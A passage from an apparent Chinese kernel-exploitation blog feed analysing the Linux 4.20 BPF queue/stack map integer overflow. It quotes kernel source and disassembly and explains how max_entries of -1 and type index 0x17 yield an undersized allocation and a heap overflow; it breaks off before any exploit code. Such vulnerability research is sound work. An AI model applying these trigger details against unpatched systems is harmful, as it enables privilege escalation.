></p><p>这里exp我是直接用的原文的exp，因为理解漏洞之后操作起来就比较简单了，主要麻烦的就是构造eBPF指令</p><hr><p>题目放在:<a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p><p>参考文章:<a class="link"   href="http://p4nda.top/2019/01/18/CVE-2017-16995/#do-check" >http://p4nda.top/2019/01/18/CVE-2017-16995/#do-check<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这一篇是作为ebpf的入门文章，所以会稍微介绍一下指令集，寄存器。可能篇幅略长。&lt;/p&gt;
&lt;h2 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h2&gt;&lt;p&gt;该漏洞最早是由17年12月2</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="ebpf" scheme="https://cv196082.gitee.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>Linux kernel 4.20 BPF 整数溢出漏洞</title>
    <link href="https://cv196082.gitee.io/2022/10/02/Linux-kernel-4-20-BPF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
    <id>https://cv196082.gitee.io/2022/10/02/Linux-kernel-4-20-BPF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-10-02T06:51:24.000Z</published>
    <updated>2022-10-02T06:51:57.434Z</updated>
    
    <content type="html"><![CDATA[<p>题目会放在:<a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>kernel中的bpf模块主要用于用户态定义数据包过滤方法，如常见的抓包工具都基于此实现，并且用户态的Seccomp功能也与此功能相似。</p><h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>该漏洞存在于BPF_MAP_CREATE功能中，并且可以看到处理的函数是map_create。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(bpf, <span class="keyword">int</span>, cmd, <span class="keyword">union</span> bpf_attr __user *, uattr, <span class="keyword">unsigned</span> <span class="keyword">int</span>, size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sysctl_unprivileged_bpf_disabled &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">    <span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">  err = bpf_check_uarg_tail_zero(uattr, <span class="keyword">sizeof</span>(attr), size);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  size = <span class="keyword">min_t</span>(u32, size, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy attributes from user space, may be less than sizeof(bpf_attr) */</span></span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(&amp;attr, uattr, size) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">  err = security_bpf(cmd, &amp;attr, size);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> BPF_MAP_CREATE:</span><br><span class="line">      err = map_create(&amp;attr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> BPF_MAP_LOOKUP_ELEM:</span><br><span class="line">      err = map_lookup_elem(&amp;attr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> BPF_MAP_UPDATE_ELEM:</span><br><span class="line">      err = map_update_elem(&amp;attr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到下面使用find_and_alloc_map函数创建一个map结构体，并为其分配编号，然后寻找出来生成的map。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_create</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="keyword">int</span> f_flags;</span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  err = CHECK_ATTR(BPF_MAP_CREATE);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  f_flags = bpf_get_file_flag(attr-&gt;map_flags);</span><br><span class="line">  <span class="keyword">if</span> (f_flags &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> f_flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (numa_node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)numa_node &gt;= nr_node_ids ||</span><br><span class="line">       !node_online(numa_node)))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* find map type and init map: hashtable vs rbtree vs bloom vs ... */</span></span><br><span class="line">  <span class="built_in">map</span> = find_and_alloc_map(attr);</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">    <span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">  err = bpf_obj_name_cpy(<span class="built_in">map</span>-&gt;name, attr-&gt;map_name);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line"></span><br><span class="line">  atomic_set(&amp;<span class="built_in">map</span>-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">  atomic_set(&amp;<span class="built_in">map</span>-&gt;usercnt, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (attr-&gt;btf_key_type_id || attr-&gt;btf_value_type_id) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!attr-&gt;btf_key_type_id || !attr-&gt;btf_value_type_id) &#123;</span><br><span class="line">      err = -EINVAL;</span><br><span class="line">      <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    btf = btf_get_by_fd(attr-&gt;btf_fd);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(btf)) &#123;</span><br><span class="line">      err = PTR_ERR(btf);</span><br><span class="line">      <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = map_check_btf(<span class="built_in">map</span>, btf, attr-&gt;btf_key_type_id,</span><br><span class="line">                        attr-&gt;btf_value_type_id);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      btf_put(btf);</span><br><span class="line">      <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span>-&gt;btf = btf;</span><br><span class="line">    <span class="built_in">map</span>-&gt;btf_key_type_id = attr-&gt;btf_key_type_id;</span><br><span class="line">    <span class="built_in">map</span>-&gt;btf_value_type_id = attr-&gt;btf_value_type_id;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  err = security_bpf_map_alloc(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line"></span><br><span class="line">  err = bpf_map_init_memlock(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map_sec;</span><br><span class="line"></span><br><span class="line">  err = bpf_map_alloc_id(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map;</span><br><span class="line"></span><br><span class="line">  err = bpf_map_new_fd(<span class="built_in">map</span>, f_flags);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* failed to allocate fd.</span></span><br><span class="line"><span class="comment"> * bpf_map_put() is needed because the above</span></span><br><span class="line"><span class="comment"> * bpf_map_alloc_id() has published the map</span></span><br><span class="line"><span class="comment"> * to the userspace and the userspace may</span></span><br><span class="line"><span class="comment"> * have refcnt-ed it through BPF_MAP_GET_FD_BY_ID.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    bpf_map_put(<span class="built_in">map</span>);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  free_map:</span><br><span class="line">  bpf_map_release_memlock(<span class="built_in">map</span>);</span><br><span class="line">  free_map_sec:</span><br><span class="line">  security_bpf_map_free(<span class="built_in">map</span>);</span><br><span class="line">  free_map_nouncharge:</span><br><span class="line">  btf_put(<span class="built_in">map</span>-&gt;btf);</span><br><span class="line">  <span class="built_in">map</span>-&gt;ops-&gt;map_free(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面分析find_and_alloc_map函数，那么首先还是先看一下传参结构体的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* anonymous struct used by BPF_MAP_CREATE command */</span></span><br><span class="line">__u32map_type;<span class="comment">/* one of enum bpf_map_type */</span></span><br><span class="line">__u32key_size;<span class="comment">/* size of key in bytes */</span></span><br><span class="line">__u32value_size;<span class="comment">/* size of value in bytes */</span></span><br><span class="line">__u32max_entries;<span class="comment">/* max number of entries in a map */</span></span><br><span class="line">__u32map_flags;<span class="comment">/* BPF_MAP_CREATE related</span></span><br><span class="line"><span class="comment"> * flags defined above.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__u32inner_map_fd;<span class="comment">/* fd pointing to the inner map */</span></span><br><span class="line">__u32numa_node;<span class="comment">/* numa node (effective only if</span></span><br><span class="line"><span class="comment"> * BPF_F_NUMA_NODE is set).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span>map_name[BPF_OBJ_NAME_LEN];</span><br><span class="line">__u32map_ifindex;<span class="comment">/* ifindex of netdev to create on */</span></span><br><span class="line">__u32btf_fd;<span class="comment">/* fd pointing to a BTF type data */</span></span><br><span class="line">__u32btf_key_type_id;<span class="comment">/* BTF type_id of the key */</span></span><br><span class="line">__u32btf_value_type_id;<span class="comment">/* BTF type_id of the value */</span></span><br><span class="line">&#125;;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">find_and_alloc_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">u32 type = attr-&gt;map_type;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (type &gt;= ARRAY_SIZE(bpf_map_types))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">type = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));</span><br><span class="line">ops = bpf_map_types[type];</span><br><span class="line"><span class="keyword">if</span> (!ops)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ops-&gt;map_alloc_check) &#123;</span><br><span class="line">err = ops-&gt;map_alloc_check(attr);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (attr-&gt;map_ifindex)</span><br><span class="line">ops = &amp;bpf_map_offload_ops;</span><br><span class="line"><span class="built_in">map</span> = ops-&gt;map_alloc(attr);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line"><span class="built_in">map</span>-&gt;ops = ops;</span><br><span class="line"><span class="built_in">map</span>-&gt;map_type = type;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里是首先根据type作为索引得到ops，最后再调用ops中的map_alloc函数但是可以注意到的是在数组中存在以下的ops结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">queue_map_ops</span> =</span> &#123;</span><br><span class="line">.map_alloc_check = queue_stack_map_alloc_check,</span><br><span class="line">.map_alloc = queue_stack_map_alloc,</span><br><span class="line">.map_free = queue_stack_map_free,</span><br><span class="line">.map_lookup_elem = queue_stack_map_lookup_elem,</span><br><span class="line">.map_update_elem = queue_stack_map_update_elem,</span><br><span class="line">.map_delete_elem = queue_stack_map_delete_elem,</span><br><span class="line">.map_push_elem = queue_stack_map_push_elem,</span><br><span class="line">.map_pop_elem = queue_map_pop_elem,</span><br><span class="line">.map_peek_elem = queue_map_peek_elem,</span><br><span class="line">.map_get_next_key = queue_stack_map_get_next_key,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里的漏洞也就存在于上述结构体中的<code>queue_stack_map_alloc</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF8119D17A 44 89 F0                      mov     eax, r14d</span><br><span class="line">.text:FFFFFFFF8119D17D 4C 8B 3C C5 80 83 02 82       mov     r15, ds:qword_FFFFFFFF82028380[rax*8]</span><br><span class="line">  </span><br><span class="line">.rodata:FFFFFFFF82028380 qword_FFFFFFFF82028380   dq 0                    ; DATA XREF: map_create+AD↑r</span><br><span class="line">; ... ...</span><br><span class="line">.rodata:FFFFFFFF82028410                 dq offset unk_FFFFFFFF8210F0A0</span><br><span class="line">.rodata:FFFFFFFF82028418                 dq offset unk_FFFFFFFF82029B00</span><br><span class="line">.rodata:FFFFFFFF82028420                 dq offset unk_FFFFFFFF8202A680</span><br><span class="line">.rodata:FFFFFFFF82028428                 dq offset unk_FFFFFFFF82029B00</span><br><span class="line">.rodata:FFFFFFFF82028430                 dq offset unk_FFFFFFFF82029C40</span><br><span class="line">.rodata:FFFFFFFF82028438                 dq offset off_FFFFFFFF82029BA0</span><br><span class="line">; ... ...</span><br><span class="line">.rodata:FFFFFFFF82029BA0                 dq offset queue_stack_map_alloc_check</span><br><span class="line">.rodata:FFFFFFFF82029BA8                 dq offset queue_stack_map_alloc</span><br><span class="line">.rodata:FFFFFFFF82029BB0                 dq 0</span><br><span class="line">.rodata:FFFFFFFF82029BB8                 dq offset queue_stack_map_free</span><br><span class="line">.rodata:FFFFFFFF82029BC0                 dq offset queue_stack_map_get_next_key</span><br><span class="line">.rodata:FFFFFFFF82029BC8                 dq 0</span><br><span class="line">.rodata:FFFFFFFF82029BD0                 dq offset queue_stack_map_lookup_elem</span><br><span class="line">.rodata:FFFFFFFF82029BD8                 dq offset queue_stack_map_update_elem</span><br><span class="line">.rodata:FFFFFFFF82029BE0                 dq offset queue_stack_map_delete_elem</span><br><span class="line">.rodata:FFFFFFFF82029BE8                 dq offset queue_stack_map_push_elem</span><br><span class="line">.rodata:FFFFFFFF82029BF0                 dq offset stack_map_pop_elem</span><br><span class="line">.rodata:FFFFFFFF82029BF8                 dq offset stack_map_peek_elem</span><br></pre></td></tr></table></figure><p>可以看到只要计算偏移就可以成功修改ops为<code>queue_stack_map_alloc</code>函数，经过计算可得type为:<code>(0xFFFFFFFF82028438 - 0xFFFFFFFF82028380）/8 = 0x17 </code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">queue_stack_map_alloc</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret, numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span>;</span></span><br><span class="line">u64 size, queue_size, cost;</span><br><span class="line"></span><br><span class="line">size = (u64) attr-&gt;max_entries + <span class="number">1</span>;</span><br><span class="line">cost = queue_size = <span class="keyword">sizeof</span>(*qs) + size * attr-&gt;value_size;</span><br><span class="line"><span class="keyword">if</span> (cost &gt;= U32_MAX - PAGE_SIZE)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-E2BIG);</span><br><span class="line"></span><br><span class="line">cost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">ret = bpf_map_precharge_memlock(cost);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line"></span><br><span class="line">qs = bpf_map_area_alloc(queue_size, numa_node);</span><br><span class="line"><span class="keyword">if</span> (!qs)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(qs, <span class="number">0</span>, <span class="keyword">sizeof</span>(*qs));</span><br><span class="line"></span><br><span class="line">bpf_map_init_from_attr(&amp;qs-&gt;<span class="built_in">map</span>, attr);</span><br><span class="line"></span><br><span class="line">qs-&gt;<span class="built_in">map</span>.pages = cost;</span><br><span class="line">qs-&gt;size = size;</span><br><span class="line"></span><br><span class="line">raw_spin_lock_init(&amp;qs-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;qs-&gt;<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里的cost其实就是等于<code>sizeof(*qs) + (attr-&gt;value_size) * (attr-&gt;max_entries+1)</code>，并且这里的attr是我们可控的，如果我们控制<code>attr-&gt;max_entries</code>为-1那么这里申请的大小只有<code>sizeof(struct bpf_queue_stack)</code>并且这个size其实是管理堆块的大小，用于存储数据结构，后面的内容为数据存储结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bpf_map_init_from_attr</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">map</span>-&gt;map_type = attr-&gt;map_type;</span><br><span class="line"><span class="built_in">map</span>-&gt;key_size = attr-&gt;key_size;</span><br><span class="line"><span class="built_in">map</span>-&gt;value_size = attr-&gt;value_size;</span><br><span class="line"><span class="built_in">map</span>-&gt;max_entries = attr-&gt;max_entries;</span><br><span class="line"><span class="built_in">map</span>-&gt;map_flags = attr-&gt;map_flags;</span><br><span class="line"><span class="built_in">map</span>-&gt;numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后将用户传进来的attr赋值过去。最后生成id，并将id返回给用户。</p><h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><p>可以看到在上面的系统调用中存在BPF_MAP_UPDATE_ELEM功能，其实现的函数为：map_update_elem</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_update_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line">  <span class="keyword">void</span> __user *uvalue = u64_to_user_ptr(attr-&gt;value);</span><br><span class="line">  <span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *key, *value;</span><br><span class="line">  u32 value_size;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_UPDATE_ELEM))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  f = fdget(ufd);</span><br><span class="line">  <span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">    <span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(f.file-&gt;f_mode &amp; FMODE_CAN_WRITE)) &#123;</span><br><span class="line">    err = 